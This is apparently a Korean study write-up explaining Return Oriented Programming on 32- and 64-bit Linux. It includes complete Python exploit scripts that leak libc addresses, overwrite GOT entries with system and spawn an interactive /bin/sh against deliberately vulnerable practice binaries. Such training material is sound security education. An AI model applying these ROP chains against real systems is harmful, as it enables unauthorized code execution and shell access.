# 32bit Return Oriented Programming

#### ROP

- PLT에는 프로그램 내에서 호출하는 함수들만 존재한다.
- 그러나 익스플로잇 대상 바이너리인 example4에서는 system과 같은 쉘을 획득하는 데 필요한 함수를 사용하지 않기 때문에 ASLR 환경에서 직접적으로 이를 호출할 수 없다.

```c
//example4.c
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}
```

- 32비트 ELF 바이너리는 ASLR로 랜덤화되는 주소의 범위가 크지 않기 떄문에 호출하고자 하는 라이브러리 함수의 주소를 무차별 대입을 통해 맞출 수도 있지만, 100%에 가까운 확률로 익스플로잇할 수 있는 공격 기법이 있다.

#### ROP

- 코드 영역에 있는 다양한 코드 가젯들을ㄹ 조합해 NX bit와 ASLR 보호 기법을 우회할 수 있는 공격 기법이다.
- 스택 오버플로우와 같은 취약점으로 콜 스택을 통제할 수 있기 때문에 주로 스택 기반 연산을 하는 코드 가젯들이 사용된다.
- 바이너리 코드 영역에 example5와 같은 코드 가젯들이 존재한다.

```assembly
; example5
0x8048380:
  pop eax
  ret
0x8048480:
  xchg ebp, ecx
  ret
  
0x8048580:
  mov ecx, eax
  ret
```

- 스택 오버플로우 취약점을 통해 리턴 주소 및 그 뒤의 메모리를 원하는 값으로 덮어쓸 수 잇다고 가정하였을 때, example5 코드 가젯들로 ebp 레지스터의 값을 0xdeadbeef로 바꿔보자.



#### Solution of example5

- example5에 있는 코드 가젯들은 모두 ret 명령어로 끝난다.
- 이는 하나의 코드 가젯의 실행이 끝난 후 다음 코드 가젯으로 리턴하여 여러 가젯들을 체이닝하여 실행하는 것을 가능하게 해준다.

| [ 0x8048380 ]  |
| :------------: |
| **0x41414141** |
| **0x8048580**  |

- 리턴 주소를 시작으로 스택이 위와 같이 구성되어 있다고 가정해 보자. (현재 esp 레지스터가 가리키고 있는 메모리는 []로 표시되어 있다.)

- 스택 오버플로우 취약점이 존재하는 함수가 리턴할 때, 리턴 주소가 0x8048380으로 바뀌어 있기 때문에 0x8048380으로 점프한다. 이때 스택과 esp 레지스터의 상태는 다음과 같다.

|     0x8048380      |
| :----------------: |
| **[ 0x41414141 ]** |
|   **0x8048580**    |

- 0x8048380에서 pop eax를 실행하면 eax 레지스터에 현재 esp 레지스터가 가리키고 있는 0x41414141이 들어가게 되고, 스태과 esp 레지스터는 다음과 같은 상태가 된다.

|     0x8048380     |
| :---------------: |
|  **0x41414141**   |
| **[ 0x8048580 ]** |

- 0x8048380에 위치한 코드 가젯인 pop eax를 실행한 후에 ret을 실행하기 때문에 실행 흐름은 현재 esp 레지스터가 가리키고 있는 0x8048580으로 프로그램의 실행 순서를 변경하여 다른 명령을 실행할 수 있게 한다.
- 0x8048580 코드 가젯은 mov ecx, eax 이기 때문에 ecx에 0x41414141이 들어가게 된다.



### Solution of example5 - cond.

이렇듯, **ret 명령으로 코드 가젯들을 사용하면 여러 가젯을 연결하여 하나의 가젯으로는 할 수 없는 행위를 할 수 있게된다. ** 이러한 기술은 마치 리턴을 이용해 여러 코드를 묶어 프로그래밍하는 것과 같아 **Return Oriented Programming(ROP)**이라 불리게 되었다.

- ebp 레지스터의 값으르 0xdeadbeef 로 바꾸기 위해 구성된 스택은 다음과 같다.

Low

|   0x8048380    |
| :------------: |
| **0xdeadbeef** |
| **0x8048580**  |
| **0x8048480**  |

High

이와 같이 스택이 구성되면 아래와 같이 **pop eax(0xdeadbeef) + mov ecx, eax + xchg ebp, ecx** 명령어들이 순차적으로 실행되어 최종적으로는 ebp 레지스터에 0xdeadbeef 값이 들어가게 된다.



## Exploit using ROP

- ROP를 이용해 example4를 공격해 보자.
- 최종 목표는 system("/bin/sh")를 실행하는 것이다.

```c
//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int main(void){
	char buf[32] = {};
	puts("Hello World!");
	puts("Hello ASLR!");
	scanf("%s", buf);
	return 0;
}
```

1. system 함수의 주소와 "/bin/sh" 문자열의 주소 찾기

-> 프로그램은 실행될 때마다 라이브러리 주소가 랜덤하게 매핑된다. 그러나 한 번 매핑된 라이브러리 주소는 프로그램이 종료될 때까지 바뀌지 않는다. 이를 이용하여 주소를 찾을 수 있다.

#### Leaking libc-2.23.so Address

- 앞서 라이브러리 함수를 사용하고 나면, GOT에 해당 함수의 주소가 저장된다는 것을 배웠다. 바이너리에 존재하는  puts 함수의 PLT를 이용해 scanf의 GOT에 있는 scanf 함수의 실제 주소를 출력해보자.

![image](https://user-images.githubusercontent.com/59410565/119140383-0b695f00-ba7f-11eb-9078-1db58b429a08.png)

- puts@plt : 0x8048320
- scanf@plt에서 참조하는 주소 0x804a014가 scanf@got.plt 이다.
- 공격 코드를 만들기 전에 scanf에서 "%s" 포맷 스트링이 공백이나 개행 등 단어를 구분하는 문자를 입력하면 더 이상 입력을 받지 않는다는 것을 주의해야 한다.

-> puts@plt 주소는 공백 문자로 시작하기 때문에 공격 코드에 사용하지 x

-> puts@plt+6으로 점프해도 puts@plt를 호출한 것과 같은 결과. 따라서 공격 코드에서는 입력의 종료를 방지하기 위해 0x8048326을 사용한다.

- scanf의 GOT 주소에 저장된 값을 출력해 보자.

![image](https://user-images.githubusercontent.com/59410565/119141646-7a938300-ba80-11eb-8cae-f98e7f238237.png)

- scanf 함수 주소에 아스키 범위를 넘어선 문자가 존재하기 때문에 불가하다.
- 동적으로 변화하는 아스키 범위 밖의 문자를 읽기 위해 공격 코드를 스크립트로 작성할 필요가 있다.

```python
#!/usr/bin/python2.7
'''
example4_leak.py
'''
import struct
import subprocess
import os
import pty
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n
payload  = "A"*36           # buf padding
payload += p32(0x8048326)   # ret addr (puts@plt + 6)
payload += p32(0xdeadbeef)  # ret after puts
payload += p32(0x804a014)   # scanf@got
writeline(s, payload)
out = readline(out_r)     # memory leakage of scanf@got
print `out`
scanf_addr = u32(out[:4])
print "scanf @ " + hex(scanf_addr)
```

![image](https://user-images.githubusercontent.com/59410565/119142030-f7266180-ba80-11eb-864c-df33a051f508.png)

- 스크립트를 실행하면 example4로부터 scanf의 주소를 구해 출력하는 것을 볼 수 있다. 
- 구한 scanf의 주소와 libc 베이스 주소로부터 scanf 함수 주소까지의 오프셋을 이용해 libc의 베이스 주소를 구할 수 있다.

```
libc 베이스 주소 = scanf 주소 - libc 베이스 주소로부터 scanf 주소까지의 오프셋
```

![image](https://user-images.githubusercontent.com/59410565/119142457-7c117b00-ba81-11eb-9aed-b179727dec17.png)

```
libc 베이스 주소 = scanf 주소 - 0x5c0d0
```



#### Exploit using ROP

릭된 libc-2.23.so 라이브러리 주소를 이용하여 쉘을 얻어보자.

- 익스플로잇에서는 ROP를 통해 scanf 함수를 호출해 scanf@got에는 system 함수의 주소를, scanf@got+4에는 "/bin/sh" 문자열을 입력한 후 scanf@plt를 호출하여 최종적으로 system("/bin/sh")를 실행한다.
- ROP 체인에서 함수를 호출할 때, 다음 체인을 실행하기 위해 esp 레지스터를 호출한 함수의 인자 다음으로 가리키게 해야 한다.

-> objdump를 이용해 pop; pop; ret 코드 가젯을 찾아자.

![image](https://user-images.githubusercontent.com/59410565/119143076-28536180-ba82-11eb-929c-d1f300ea982c.png)

- objdump의 결과를 보면 0x804851a 주소에 pop; pop; ret 코드 가젯이 존재하는 것을 알 수 있다.
- pop; pop; ret 코드 가젯을 이용하여 esp 레지스터를 scanf 함수의 인자 2개 이후 주소로 가리키게 해주었다.

![image](https://user-images.githubusercontent.com/59410565/119143338-75cfce80-ba82-11eb-96fb-1ad2c6d95df9.png)

```python
#!/usr/bin/python
'''
example4.py
'''
import struct
import subprocess
import os
import pty
import time
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()    # to ignore buffer
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
'''
0x804851a <__libc_csu_init+90>:  pop    %edi
0x804851b <__libc_csu_init+91>:  pop    %ebp
0x804851c <__libc_csu_init+92>:  ret    
'''
pop_pop_ret = 0x804851a
pop_ret = pop_pop_ret + 1
scanf_plt = 0x8048340
puts_plt = 0x8048320
puts_got = 0x804a00c
string_fmt = 0x8048559      # "%s"
scanf_got = 0x804a014
print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n
payload  = "A"*36           # buf padding
payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)
print `payload`
writeline(s, payload)
libc = u32(readline(out_r)[:4]) - 0x5c0c0
system = libc + 0x3ada0
print "libc @ " + hex(libc)
print "system @ " + hex(system)
writeline(s, p32(system)+"/bin/sh\x00")
print "[+] get shell"
while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  print read(out_r, 1024)
```

exploit 코드를 실행하면 쉘을 성공적으로 획득한 것을 볼 수 있다.

![image](https://user-images.githubusercontent.com/59410565/119143543-ad3e7b00-ba82-11eb-9939-db16072393e3.png)



# 64비트 ROP

- 32비트 아키텍쳐에서는 함수 호출시 인자를 스택에 저장하는 반면 64비트 아키텍쳐에서는 함수의 인자를 레지스터와 스택에 저장해 전달한다.
- call64.c 는 64비트 아키텍쳐의 함수 호출 규약을 확인하기 위해 printf 함수에 7개의 인자를 전달하여 호출하는 코드이다.

```c
// gcc -o call64 call64.c 
#include <stdio.h>
int main()
{
	printf("%d + %d = %d\n %d + %d = %d\n",1,2,3,4,5,9);
	return 0;
}
```

![image](https://user-images.githubusercontent.com/59410565/119143928-23db7880-ba83-11eb-8221-9b37c799e7ba.png)

- printf 함수 호출 이전에 인자를 각각 레지스터와 스택에 넣고 호출한다. 디스어셈블리 결과를 보면 64비트에서 함수가 호출될 때 전달되는 인자는 다음과 같다.

| Factor | Description    |
| :----: | -------------- |
|  RDI   | 첫 번째 인자   |
|  RSI   | 두 번째 인자   |
|  RDX   | 세 번째 인자   |
|  RCX   | 네 번째 인자   |
|   R8   | 다섯 번째 인자 |
|   R9   | 여섯 번째 인자 |
| STACK  | 일곱 번째 인자 |
| STACK  | 여덟 번째 인자 |
|  ....  | ...            |

- rdi, rsi, rdx, rcx, r8, r9 레지스터를 전부 사용하면 다음 인자부터는 스택에 저장한다. 64비트 아키텍쳐에서는 pop과 같은 명령어를 통해 함수의 인자를 전달하는 방법으로 ROP를 할 수 있다.



#### rop64.c

```c
// gcc -o rop64 rop64.c -fno-stack-protector
#include <stdio.h>
#include <unistd.h>
void gadget() {
	asm("pop %rdi");
	asm("pop %rsi");
	asm("pop %rdx");
	asm("ret");
}
int main()
{
	char buf[256];
	write(1, "Data: ", 6);
	read(0, buf, 1024); 
	return 0;
}
```

- 스택 버퍼 오버플로우 취약점이 존재
- pop rdi; pop rsi; pop rdx; ret 코드 가젯의 주소 알아내기

![image](https://user-images.githubusercontent.com/59410565/119144895-1a064500-ba84-11eb-9c85-54cbb704e3d4.png)

- 해당 코드 가젯은 0x40056a 주소에 존재한다. 찾은 코드 가젯을 이용해 write 함수를 호출한 뒤 write@got에 저장되어 있는 값을 출력해서 라이브러리 주소를 알아내자.

![image](https://user-images.githubusercontent.com/59410565/119152245-19bd7800-ba8b-11eb-8441-86933370c1b5.png)

![image](https://user-images.githubusercontent.com/59410565/119147589-b5001e80-ba86-11eb-8892-2e9eb5760573.png)

-> write@plt : 0x400430 / write@got.plt : 0x601018

-> read@plt : 0x400440 / read@got.plt : 0x601020

![image](https://user-images.githubusercontent.com/59410565/119150410-62743180-ba89-11eb-9f2e-3058c6f34cb5.png)

-> write offset : 0xd5c90

-> system offset : 0x3adb0

- 이후 알아낸 라이브러리 주소를 통해 write@got를 system 함수로 덮어쓰고 "/bin/sh" 문자열을 입력한다.

```python
# rop64.py
import struct
import subprocess
import os
import pty
import time
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\x20':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + "\n")
  except:
    raise
def p64(val):
  return struct.pack("<Q", val)
def u64(data):
  return struct.unpack("<Q", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
print `read(out_r, 6)`
# write(1, 0x601018, 8)
payload  = "A"*264         # buf padding
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(1)          # fd
payload += p64(0x601018)   # write@got
payload += p64(8)          # 8 
payload += p64(0x400430)   # write_plt 
# read(0, 0x601018, 16)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0)          # fd
payload += p64(0x601018)   # write@got
payload += p64(16)          # 8
payload += p64(0x400440)   # read@plt
# write(0x601020,0,0)
payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0x601020)   # /bin/sh
payload += p64(0)          # 0
payload += p64(0)          # 0
payload += p64(0x400430)   # write@plt
writeline(s, payload)

libc = u64(read(out_r,8)[:8])
base = libc - 0xd5c90
system = base + 0x3adb0
print hex(libc)
writeline(s, p64(system)+"/bin/sh\x00")
while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  print read(out_r, 1024)
```

- 최종적으로 write 함수를 호출하고 "/bin/sh" 문자열 주소인 0x601020를 첫 번째 인자로 전달하면 쉘을 획득할 수 있다.

![image](https://user-images.githubusercontent.com/59410565/119153547-4faf2c00-ba8c-11eb-9363-f8df6ff0d70c.png)

> 왜 IOError : [Errno 32] Broken pipe 오류가 발생할까...?

